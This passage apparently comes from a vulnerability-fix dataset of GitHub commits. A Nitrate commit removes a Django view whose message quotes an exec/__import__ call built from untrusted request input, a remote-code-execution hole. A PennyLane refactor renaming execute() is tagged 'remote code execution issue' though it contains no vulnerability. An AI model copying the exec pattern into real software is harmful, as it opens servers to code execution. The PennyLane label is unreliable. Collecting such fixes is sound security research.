drop-down\\n\n    in a Ajax way.\n    \"\"\"\n    data = request.GET.copy()\n    target = data.get('target', None)\n    p_pks = data.get('p_ids', None)\n    sep = data.get('sep', None)\n    # py2.6: all(*values) => boolean ANDs\n    if target and p_pks and sep:\n        p_pks = [k for k in p_pks.split(sep) if k]\n        res = get_prod_related_objs(p_pks, target)\n    else:\n        res = []\n    return HttpResponse(json.dumps(res))\n\n\ndef objects_update(objects, **kwargs):\n    objects.update(**kwargs)\n    kwargs['instances'] = objects\n    if objects.model.__name__ == TestCaseRun.__name__ and kwargs.get(\n            'case_run_status', None):\n        POST_UPDATE_SIGNAL.send(sender=None, **kwargs)\n"}, "/tcms/core/tests/test_views.py": {"changes": [{"diff": "\n from tcms.management.models import Priority\n from tcms.management.models import EnvGroup\n from tcms.management.models import EnvProperty\n-from tcms.testcases.forms import CaseAutomatedForm\n from tcms.testcases.forms import TestCase\n from tcms.testplans.models import TestPlan\n from tcms.testruns.models import TestCaseRun\n", "add": 0, "remove": 1, "filename": "/tcms/core/tests/test_views.py", "badparts": ["from tcms.testcases.forms import CaseAutomatedForm"], "goodparts": []}, {"diff": "\n             'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)\n \n \n-class TestGetForm(test.TestCase):\n-    \"\"\"Test case for form\"\"\"\n-\n-    def test_get_form(self):\n-        response = self.client.get(reverse('ajax-form'),\n-                                   {'app_form': 'testcases.CaseAutomatedForm'})\n-        form = CaseAutomatedForm()\n-        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())\n-\n-\n class TestUpdateCasePriority(BasePlanCase):\n     \"\"\"Test case for update_cases_default_tester\"\"\"\n", "add": 0, "remove": 10, "filename": "/tcms/core/tests/test_views.py", "badparts": ["class TestGetForm(test.TestCase):", "    \"\"\"Test case for form\"\"\"", "    def test_get_form(self):", "        response = self.client.get(reverse('ajax-form'),", "                                   {'app_form': 'testcases.CaseAutomatedForm'})", "        form = CaseAutomatedForm()", "        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())"], "goodparts": []}], "source": "\n import json from http import HTTPStatus from urllib.parse import urlencode from django import test from django.conf import settings from django.contrib.contenttypes.models import ContentType from django.core import serializers from django.urls import reverse from django_comments.models import Comment from tcms.management.models import Priority from tcms.management.models import EnvGroup from tcms.management.models import EnvProperty from tcms.testcases.forms import CaseAutomatedForm from tcms.testcases.forms import TestCase from tcms.testplans.models import TestPlan from tcms.testruns.models import TestCaseRun from tcms.testruns.models import TestCaseRunStatus from tcms.tests import BaseCaseRun from tcms.tests import BasePlanCase from tcms.tests import remove_perm_from_user from tcms.tests import user_should_have_perm from tcms.tests.factories import UserFactory from tcms.tests.factories import EnvGroupFactory from tcms.tests.factories import EnvGroupPropertyMapFactory from tcms.tests.factories import EnvPropertyFactory class TestNavigation(test.TestCase): @classmethod def setUpTestData(cls): super(TestNavigation, cls).setUpTestData() cls.user=UserFactory(email='user+1@example.com') cls.user.set_password('testing') cls.user.save() def test_urls_for_emails_with_pluses(self): self.client.login( username=self.user.username, password='testing') response=self.client.get(reverse('iframe-navigation')) self.assertContains(response, urlencode({'people': self.user.email})) self.assertContains(response, urlencode({'author__email__startswith': self.user.email})) class TestIndex(BaseCaseRun): def test_when_not_logged_in_index_page_redirects_to_login(self): response=self.client.get(reverse('core-views-index')) self.assertRedirects( response, reverse('tcms-login'), target_status_code=HTTPStatus.OK) def test_when_logged_in_index_page_redirects_to_dashboard(self): self.client.login( username=self.tester.username, password='password') response=self.client.get(reverse('core-views-index')) self.assertRedirects( response, reverse('tcms-recent', args=[self.tester.username]), target_status_code=HTTPStatus.OK) class TestCommentCaseRuns(BaseCaseRun): \"\"\"Test case for ajax.comment_case_runs\"\"\" @classmethod def setUpTestData(cls): super(TestCommentCaseRuns, cls).setUpTestData() cls.many_comments_url=reverse('ajax-comment_case_runs') def test_refuse_if_missing_comment(self): self.client.login( username=self.tester.username, password='password') response=self.client.post(self.many_comments_url, {'run':[self.case_run_1.pk, self.case_run_2.pk]}) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 1, 'response': 'Comments needed'}) def test_refuse_if_missing_no_case_run_pk(self): self.client.login( username=self.tester.username, password='password') response=self.client.post(self.many_comments_url, {'comment': 'new comment', 'run':[]}) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 1, 'response': 'No runs selected.'}) response=self.client.post(self.many_comments_url, {'comment': 'new comment'}) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 1, 'response': 'No runs selected.'}) def test_refuse_if_passed_case_run_pks_not_exist(self): self.client.login( username=self.tester.username, password='password') response=self.client.post(self.many_comments_url, {'comment': 'new comment', 'run': '99999998,1009900'}) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 1, 'response': 'No caserun found.'}) def test_add_comment_to_case_runs(self): self.client.login( username=self.tester.username, password='password') new_comment='new comment' response=self.client.post( self.many_comments_url, {'comment': new_comment, 'run': ','.join([str(self.case_run_1.pk), str(self.case_run_2.pk)])}) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 0, 'response': 'ok'}) case_run_ct=ContentType.objects.get_for_model(TestCaseRun) for case_run_pk in(self.case_run_1.pk, self.case_run_2.pk): comments=Comment.objects.filter(object_pk=case_run_pk, content_type=case_run_ct) self.assertEqual(new_comment, comments[0].comment) self.assertEqual(self.tester, comments[0].user) class TestUpdateObject(BasePlanCase): \"\"\"Test case for update\"\"\" @classmethod def setUpTestData(cls): super(TestUpdateObject, cls).setUpTestData() cls.permission='testplans.change_testplan' cls.update_url=reverse('ajax-update') def setUp(self): user_should_have_perm(self.tester, self.permission) def test_refuse_if_missing_permission(self): self.client.login( username=self.tester.username, password='password') remove_perm_from_user(self.tester, self.permission) post_data={ 'content_type': 'testplans.testplan', 'object_pk': self.plan.pk, 'field': 'is_active', 'value': 'False', 'value_type': 'bool' } response=self.client.post(self.update_url, post_data) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 1, 'response': 'Permission Dinied.'}) def test_update_plan_is_active(self): self.client.login( username=self.tester.username, password='password') post_data={ 'content_type': 'testplans.testplan', 'object_pk': self.plan.pk, 'field': 'is_active', 'value': 'False', 'value_type': 'bool' } response=self.client.post(self.update_url, post_data) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 0, 'response': 'ok'}) plan=TestPlan.objects.get(pk=self.plan.pk) self.assertFalse(plan.is_active) class TestUpdateCaseRunStatus(BaseCaseRun): \"\"\"Test case for update_case_run_status\"\"\" @classmethod def setUpTestData(cls): super(TestUpdateCaseRunStatus, cls).setUpTestData() cls.permission='testruns.change_testcaserun' cls.update_url=reverse('ajax-update_case_run_status') def setUp(self): user_should_have_perm(self.tester, self.permission) def test_refuse_if_missing_permission(self): remove_perm_from_user(self.tester, self.permission) self.client.login( username=self.tester.username, password='password') response=self.client.post(self.update_url,{ 'content_type': 'testruns.testcaserun', 'object_pk': self.case_run_1.pk, 'field': 'case_run_status', 'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk), 'value_type': 'int', }) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 1, 'response': 'Permission Dinied.'}) def test_change_case_run_status(self): self.client.login( username=self.tester.username, password='password') response=self.client.post(self.update_url,{ 'content_type': 'testruns.testcaserun', 'object_pk': self.case_run_1.pk, 'field': 'case_run_status', 'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk), 'value_type': 'int', }) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 0, 'response': 'ok'}) self.assertEqual( 'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name) class TestGetForm(test.TestCase): \"\"\"Test case for form\"\"\" def test_get_form(self): response=self.client.get(reverse('ajax-form'), {'app_form': 'testcases.CaseAutomatedForm'}) form=CaseAutomatedForm() self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p()) class TestUpdateCasePriority(BasePlanCase): \"\"\"Test case for update_cases_default_tester\"\"\" @classmethod def setUpTestData(cls): super(TestUpdateCasePriority, cls).setUpTestData() cls.permission='testcases.change_testcase' cls.case_update_url=reverse('ajax-update_cases_default_tester') def setUp(self): user_should_have_perm(self.tester, self.permission) def test_refuse_if_missing_permission(self): remove_perm_from_user(self.tester, self.permission) self.client.login( username=self.tester.username, password='password') response=self.client.post( self.case_update_url, { 'target_field': 'priority', 'from_plan': self.plan.pk, 'case':[self.case_1.pk, self.case_3.pk], 'new_value': Priority.objects.get(value='P3').pk, }) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 1, 'response': \"You don't have enough permission to \" \"update TestCases.\"}) def test_update_case_priority(self): self.client.login( username=self.tester.username, password='password') response=self.client.post( self.case_update_url, { 'target_field': 'priority', 'from_plan': self.plan.pk, 'case':[self.case_1.pk, self.case_3.pk], 'new_value': Priority.objects.get(value='P3').pk, }) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), {'rc': 0, 'response': 'ok'}) for pk in(self.case_1.pk, self.case_3.pk): self.assertEqual('P3', TestCase.objects.get(pk=pk).priority.value) class TestGetObjectInfo(BasePlanCase): \"\"\"Test case for info view method\"\"\" @classmethod def setUpTestData(cls): super(TestGetObjectInfo, cls).setUpTestData() cls.get_info_url=reverse('ajax-info') cls.group_nitrate=EnvGroupFactory(name='nitrate') cls.group_new=EnvGroupFactory(name='NewGroup') cls.property_os=EnvPropertyFactory(name='os') cls.property_python=EnvPropertyFactory(name='python') cls.property_django=EnvPropertyFactory(name='django') EnvGroupPropertyMapFactory(group=cls.group_nitrate, property=cls.property_os) EnvGroupPropertyMapFactory(group=cls.group_nitrate, property=cls.property_python) EnvGroupPropertyMapFactory(group=cls.group_new, property=cls.property_django) def test_get_env_properties(self): response=self.client.get(self.get_info_url,{'info_type': 'env_properties'}) expected_json=json.loads( serializers.serialize( 'json', EnvProperty.objects.all(), fields=('name', 'value'))) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), expected_json) def test_get_env_properties_by_group(self): response=self.client.get(self.get_info_url, {'info_type': 'env_properties', 'env_group_id': self.group_new.pk}) group=EnvGroup.objects.get(pk=self.group_new.pk) expected_json=json.loads( serializers.serialize( 'json', group.property.all(), fields=('name', 'value'))) self.assertJSONEqual( str(response.content, encoding=settings.DEFAULT_CHARSET), expected_json) ", "sourceWithComments": "# -*- coding: utf-8 -*-\n\nimport json\nfrom http import HTTPStatus\nfrom urllib.parse import urlencode\n\nfrom django import test\nfrom django.conf import settings\nfrom django.contrib.contenttypes.models import ContentType\nfrom django.core import serializers\nfrom django.urls import reverse\nfrom django_comments.models import Comment\n\nfrom tcms.management.models import Priority\nfrom tcms.management.models import EnvGroup\nfrom tcms.management.models import EnvProperty\nfrom tcms.testcases.forms import CaseAutomatedForm\nfrom tcms.testcases.forms import TestCase\nfrom tcms.testplans.models import TestPlan\nfrom tcms.testruns.models import TestCaseRun\nfrom tcms.testruns.models import TestCaseRunStatus\nfrom tcms.tests import BaseCaseRun\nfrom tcms.tests import BasePlanCase\nfrom tcms.tests import remove_perm_from_user\nfrom tcms.tests import user_should_have_perm\nfrom tcms.tests.factories import UserFactory\nfrom tcms.tests.factories import EnvGroupFactory\nfrom tcms.tests.factories import EnvGroupPropertyMapFactory\nfrom tcms.tests.factories import EnvPropertyFactory\n\n\nclass TestNavigation(test.TestCase):\n    @classmethod\n    def setUpTestData(cls):\n        super(TestNavigation, cls).setUpTestData()\n        cls.user = UserFactory(email='user+1@example.com')\n        cls.user.set_password('testing')\n        cls.user.save()\n\n    def test_urls_for_emails_with_pluses(self):\n        # test for https://github.com/Nitrate/Nitrate/issues/262\n        # when email contains + sign it needs to be properly urlencoded\n        # before passing it as query string argument to the search views\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.user.username,\n            password='testing')\n        response = self.client.get(reverse('iframe-navigation'))\n\n        self.assertContains(response, urlencode({'people': self.user.email}))\n        self.assertContains(response, urlencode({'author__email__startswith': self.user.email}))\n\n\nclass TestIndex(BaseCaseRun):\n    def test_when_not_logged_in_index_page_redirects_to_login(self):\n        response = self.client.get(reverse('core-views-index'))\n        self.assertRedirects(\n            response,\n            reverse('tcms-login'),\n            target_status_code=HTTPStatus.OK)\n\n    def test_when_logged_in_index_page_redirects_to_dashboard(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n        response = self.client.get(reverse('core-views-index'))\n        self.assertRedirects(\n            response,\n            reverse('tcms-recent', args=[self.tester.username]),\n            target_status_code=HTTPStatus.OK)\n\n\nclass TestCommentCaseRuns(BaseCaseRun):\n    \"\"\"Test case for ajax.comment_case_runs\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestCommentCaseRuns, cls).setUpTestData()\n        cls.many_comments_url = reverse('ajax-comment_case_runs')\n\n    def test_refuse_if_missing_comment(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'run': [self.case_run_1.pk, self.case_run_2.pk]})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Comments needed'})\n\n    def test_refuse_if_missing_no_case_run_pk(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment', 'run': []})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No runs selected.'})\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment'})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No runs selected.'})\n\n    def test_refuse_if_passed_case_run_pks_not_exist(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.many_comments_url,\n                                    {'comment': 'new comment',\n                                     'run': '99999998,1009900'})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'No caserun found.'})\n\n    def test_add_comment_to_case_runs(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        new_comment = 'new comment'\n        response = self.client.post(\n            self.many_comments_url,\n            {'comment': new_comment,\n             'run': ','.join([str(self.case_run_1.pk),\n                              str(self.case_run_2.pk)])})\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n\n        # Assert comments are added\n        case_run_ct = ContentType.objects.get_for_model(TestCaseRun)\n\n        for case_run_pk in (self.case_run_1.pk, self.case_run_2.pk):\n            comments = Comment.objects.filter(object_pk=case_run_pk,\n                                              content_type=case_run_ct)\n            self.assertEqual(new_comment, comments[0].comment)\n            self.assertEqual(self.tester, comments[0].user)\n\n\nclass TestUpdateObject(BasePlanCase):\n    \"\"\"Test case for update\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateObject, cls).setUpTestData()\n\n        cls.permission = 'testplans.change_testplan'\n        cls.update_url = reverse('ajax-update')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        remove_perm_from_user(self.tester, self.permission)\n\n        post_data = {\n            'content_type': 'testplans.testplan',\n            'object_pk': self.plan.pk,\n            'field': 'is_active',\n            'value': 'False',\n            'value_type': 'bool'\n        }\n\n        response = self.client.post(self.update_url, post_data)\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Permission Dinied.'})\n\n    def test_update_plan_is_active(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        post_data = {\n            'content_type': 'testplans.testplan',\n            'object_pk': self.plan.pk,\n            'field': 'is_active',\n            'value': 'False',\n            'value_type': 'bool'\n        }\n\n        response = self.client.post(self.update_url, post_data)\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n        plan = TestPlan.objects.get(pk=self.plan.pk)\n        self.assertFalse(plan.is_active)\n\n\nclass TestUpdateCaseRunStatus(BaseCaseRun):\n    \"\"\"Test case for update_case_run_status\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateCaseRunStatus, cls).setUpTestData()\n\n        cls.permission = 'testruns.change_testcaserun'\n        cls.update_url = reverse('ajax-update_case_run_status')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        remove_perm_from_user(self.tester, self.permission)\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.update_url, {\n            'content_type': 'testruns.testcaserun',\n            'object_pk': self.case_run_1.pk,\n            'field': 'case_run_status',\n            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),\n            'value_type': 'int',\n        })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': 'Permission Dinied.'})\n\n    def test_change_case_run_status(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(self.update_url, {\n            'content_type': 'testruns.testcaserun',\n            'object_pk': self.case_run_1.pk,\n            'field': 'case_run_status',\n            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),\n            'value_type': 'int',\n        })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n        self.assertEqual(\n            'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)\n\n\nclass TestGetForm(test.TestCase):\n    \"\"\"Test case for form\"\"\"\n\n    def test_get_form(self):\n        response = self.client.get(reverse('ajax-form'),\n                                   {'app_form': 'testcases.CaseAutomatedForm'})\n        form = CaseAutomatedForm()\n        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())\n\n\nclass TestUpdateCasePriority(BasePlanCase):\n    \"\"\"Test case for update_cases_default_tester\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestUpdateCasePriority, cls).setUpTestData()\n\n        cls.permission = 'testcases.change_testcase'\n        cls.case_update_url = reverse('ajax-update_cases_default_tester')\n\n    def setUp(self):\n        user_should_have_perm(self.tester, self.permission)\n\n    def test_refuse_if_missing_permission(self):\n        remove_perm_from_user(self.tester, self.permission)\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(\n            self.case_update_url,\n            {\n                'target_field': 'priority',\n                'from_plan': self.plan.pk,\n                'case': [self.case_1.pk, self.case_3.pk],\n                'new_value': Priority.objects.get(value='P3').pk,\n            })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 1, 'response': \"You don't have enough permission to \"\n                                  \"update TestCases.\"})\n\n    def test_update_case_priority(self):\n        self.client.login(  # nosec:B106:hardcoded_password_funcarg\n            username=self.tester.username,\n            password='password')\n\n        response = self.client.post(\n            self.case_update_url,\n            {\n                'target_field': 'priority',\n                'from_plan': self.plan.pk,\n                'case': [self.case_1.pk, self.case_3.pk],\n                'new_value': Priority.objects.get(value='P3').pk,\n            })\n\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            {'rc': 0, 'response': 'ok'})\n\n        for pk in (self.case_1.pk, self.case_3.pk):\n            self.assertEqual('P3', TestCase.objects.get(pk=pk).priority.value)\n\n\nclass TestGetObjectInfo(BasePlanCase):\n    \"\"\"Test case for info view method\"\"\"\n\n    @classmethod\n    def setUpTestData(cls):\n        super(TestGetObjectInfo, cls).setUpTestData()\n\n        cls.get_info_url = reverse('ajax-info')\n\n        cls.group_nitrate = EnvGroupFactory(name='nitrate')\n        cls.group_new = EnvGroupFactory(name='NewGroup')\n\n        cls.property_os = EnvPropertyFactory(name='os')\n        cls.property_python = EnvPropertyFactory(name='python')\n        cls.property_django = EnvPropertyFactory(name='django')\n\n        EnvGroupPropertyMapFactory(group=cls.group_nitrate,\n                                   property=cls.property_os)\n        EnvGroupPropertyMapFactory(group=cls.group_nitrate,\n                                   property=cls.property_python)\n        EnvGroupPropertyMapFactory(group=cls.group_new,\n                                   property=cls.property_django)\n\n    def test_get_env_properties(self):\n        response = self.client.get(self.get_info_url, {'info_type': 'env_properties'})\n\n        expected_json = json.loads(\n            serializers.serialize(\n                'json',\n                EnvProperty.objects.all(),\n                fields=('name', 'value')))\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            expected_json)\n\n    def test_get_env_properties_by_group(self):\n        response = self.client.get(self.get_info_url,\n                                   {'info_type': 'env_properties',\n                                    'env_group_id': self.group_new.pk})\n\n        group = EnvGroup.objects.get(pk=self.group_new.pk)\n        expected_json = json.loads(\n            serializers.serialize(\n                'json',\n                group.property.all(),\n                fields=('name', 'value')))\n        self.assertJSONEqual(\n            str(response.content, encoding=settings.DEFAULT_CHARSET),\n            expected_json)\n"}}, "msg": "[bandit] Remove veiw that calls exec & import with untrusted data\n\nIssue: [B102:exec_used] Use of exec detected.\n\nFix: Completely remove the view which does this. That was meant as\n     a function which will dynamically return HTML forms for\n     rendering on the front-end by receiving form module.ClassName\n     from the sender!\n\n     The offending code was blindly trusting untrusted input and:\n\n     exec('import tcms.%s as form' % request.GET.get('app_form'))\n     __import__('tcms.%s' % request.GET.get('app_form'))\n\n     This is actually a big deal because it allows remote code\n     execution by sending a very simple POST request!\n\nBecause the offending view is actually always called with a single\nvalue I replace it with a view that returns that particular form\nas HTML and also update the JavaScript code."}}, "https://github.com/XanaduAI/pennylane": {"e08c7a0b2dc5002a935737e661a6e8e8c9040de3": {"url": "https://api.github.com/repos/XanaduAI/pennylane/commits/e08c7a0b2dc5002a935737e661a6e8e8c9040de3", "html_url": "https://github.com/XanaduAI/pennylane/commit/e08c7a0b2dc5002a935737e661a6e8e8c9040de3", "sha": "e08c7a0b2dc5002a935737e661a6e8e8c9040de3", "keyword": "remote code execution issue", "diff": "diff --git a/openqml-pq/openqml_pq/projectq.py b/openqml-pq/openqml_pq/projectq.py\nindex 11517e82..4cac1498 100644\n--- a/openqml-pq/openqml_pq/projectq.py\n+++ b/openqml-pq/openqml_pq/projectq.py\n@@ -149,11 +149,6 @@ def __str__(self):\n     # def __del__(self):\n     #     self._deallocate()\n \n-    def execute(self):\n-        \"\"\" \"\"\"\n-        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18\n-        self._out = self.execute_queued()\n-\n     def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         #expectation_values = {}\ndiff --git a/openqml-sf/openqml_sf/fock.py b/openqml-sf/openqml_sf/fock.py\nindex 4329de93..8220dfd9 100644\n--- a/openqml-sf/openqml_sf/fock.py\n+++ b/openqml-sf/openqml_sf/fock.py\n@@ -87,7 +87,7 @@ def __init__(self, wires, *, shots=0, cutoff=None, hbar=2):\n         self.state = None\n         super().__init__(self.short_name, shots)\n \n-    def execute(self):\n+    def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         if self.eng:\n             self.eng.reset()\ndiff --git a/openqml-sf/openqml_sf/gaussian.py b/openqml-sf/openqml_sf/gaussian.py\nindex 2aaf3bfc..a807de6a 100644\n--- a/openqml-sf/openqml_sf/gaussian.py\n+++ b/openqml-sf/openqml_sf/gaussian.py\n@@ -78,7 +78,7 @@ def __init__(self, wires, *, shots=0, hbar=2):\n         self.state = None\n         super().__init__(self.short_name, shots)\n \n-    def execute(self):\n+    def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         if self.eng:\n             self.eng.reset()\ndiff --git a/openqml/device.py b/openqml/device.py\nindex 1011c5df..565f85b5 100644\n--- a/openqml/device.py\n+++ b/openqml/device.py\n@@ -136,9 +136,17 @@ def capabilities(cls):\n         \"\"\"\n         return cls._capabilities\n \n-    @abc.abstractmethod\n     def execute(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n+        self._out = self.execute_queued()\n+\n+    @abc.abstractmethod\n+    def execute_queued(self):\n+        \"\"\"Called during execute(). To be implemented by each plugin.\n+\n+        Returns:\n+          float: expectation value(s) #todo: This should become an array type to handle multiple expectation values.\n+        \"\"\"\n         raise NotImplementedError\n \n     @abc.abstractmethod\ndiff --git a/openqml/plugins/default.py b/openqml/plugins/default.py\nindex d79de290..29b1034a 100644\n--- a/openqml/plugins/default.py\n+++ b/openqml/plugins/default.py\n@@ -214,7 +214,7 @@ def __init__(self, wires, *, shots=0):\n         self._state = None\n         super().__init__(self.short_name, shots)\n \n-    def execute(self):\n+    def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         if self._state is None:\n             # init the state vector to |00..0>\n", "message": "", "files": {"/openqml-pq/openqml_pq/projectq.py": {"changes": [{"diff": "\n     # def __del__(self):\n     #     self._deallocate()\n \n-    def execute(self):\n-        \"\"\" \"\"\"\n-        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18\n-        self._out = self.execute_queued()\n-\n     def execute_queued(self):\n         \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\"\n         #expectation_values = {}", "add": 0, "remove": 5, "filename": "/openqml-pq/openqml_pq/projectq.py", "badparts": ["    def execute(self):", "        \"\"\" \"\"\"", "        self._out = self.execute_queued()"], "goodparts": []}], "source": "\n r\"\"\" ProjectQ plugin ======================== **Module name:**:mod:`openqml.plugins.projectq` .. currentmodule:: openqml.plugins.projectq This plugin provides the interface between OpenQML and ProjecQ. It enables OpenQML to optimize quantum circuits simulable with ProjectQ. ProjecQ supports several different backends. Of those, the following are useful in the current context: -projectq.backends.Simulator([gate_fusion,...])\tSimulator is a compiler engine which simulates a quantum computer using C++-based kernels. -projectq.backends.ClassicalSimulator()\t A simple introspective simulator that only permits classical operations. -projectq.backends.IBMBackend([use_hardware,...])\tThe IBM Backend class, which stores the circuit, transforms it to JSON QASM, and sends the circuit through the IBM API. See PluginAPI._capabilities['backend'] for a list of backend options. Functions --------- .. autosummary:: init_plugin Classes ------- .. autosummary:: Gate Observable PluginAPI ---- \"\"\" import logging as log import numpy as np from numpy.random import(randn,) from openqml import Device, DeviceError from openqml import Variable import projectq as pq import projectq.setups.ibm from projectq.ops import(HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, SqrtSwapGate, Rx, Ry, Rz, R) from.ops import(CNOT, CZ, Toffoli, AllZGate, Rot, Hermitian) from._version import __version__ operator_map={ 'PauliX': XGate, 'PauliY': YGate, 'PauliZ': ZGate, 'CNOT': CNOT, 'CZ': CZ, 'SWAP': SwapGate, 'RX': Rx, 'RY': Ry, 'RZ': Rz, 'Rot': Rot, } class ProjectQDevice(Device): \"\"\"ProjectQ device for OpenQML. Args: wires(int): The number of qubits of the device. Keyword Args for Simulator backend: gate_fusion(bool): If True, gates are cached and only executed once a certain gate-size has been reached(only has an effect for the c++simulator). rnd_seed(int): Random seed(uses random.randint(0, 4294967295) by default). Keyword Args for IBMBackend backend: use_hardware(bool): If True, the code is run on the IBM quantum chip(instead of using the IBM simulator) num_runs(int): Number of runs to collect statistics.(default is 1024) verbose(bool): If True, statistics are printed, in addition to the measurement result being registered(at the end of the circuit). user(string): IBM Quantum Experience user name password(string): IBM Quantum Experience password device(string): Device to use(\u2018ibmqx4\u2019, or \u2018ibmqx5\u2019) if use_hardware is set to True. Default is ibmqx4. retrieve_execution(int): Job ID to retrieve instead of re-running the circuit(e.g., if previous run timed out). \"\"\" name='ProjectQ OpenQML plugin' short_name='projectq' api_version='0.1.0' plugin_version=__version__ author='Christian Gogolin' _capabilities={'backend': list([\"Simulator\", \"ClassicalSimulator\", \"IBMBackend\"])} def __init__(self, wires, **kwargs): kwargs.setdefault('shots', 0) super().__init__(self.short_name, kwargs['shots']) for k,v in{'log':'verbose'}.items(): if k in kwargs: kwargs.setdefault(v, kwargs[k]) if 'num_runs' in kwargs: if isinstance(kwargs['num_runs'], int) and kwargs['num_runs']>0: self.n_eval=kwargs['num_runs'] else: self.n_eval=0 del(kwargs['num_runs']) self.wires=wires self.backend=kwargs['backend'] del(kwargs['backend']) self.kwargs=kwargs self.eng=None self.reg=None def reset(self): self.reg=self.eng.allocate_qureg(self.wires) def __repr__(self): return super().__repr__() +'Backend: ' +self.backend +'\\n' def __str__(self): return super().__str__() +'Backend: ' +self.backend +'\\n' def execute(self): \"\"\" \"\"\" self._out=self.execute_queued() def execute_queued(self): \"\"\"Apply the queued operations to the device, and measure the expectation.\"\"\" for operation in self._queue: if operation.name not in operator_map: raise DeviceError(\"{} not supported by device{}\".format(operation.name, self.short_name)) par=[x.val if isinstance(x, Variable) else x for x in operation.params] self.apply(operation.name, operation.wires, *par) result=self.expectation(self._observe.name, self._observe.wires) self._deallocate() return result def apply(self, gate_name, wires, *par): if 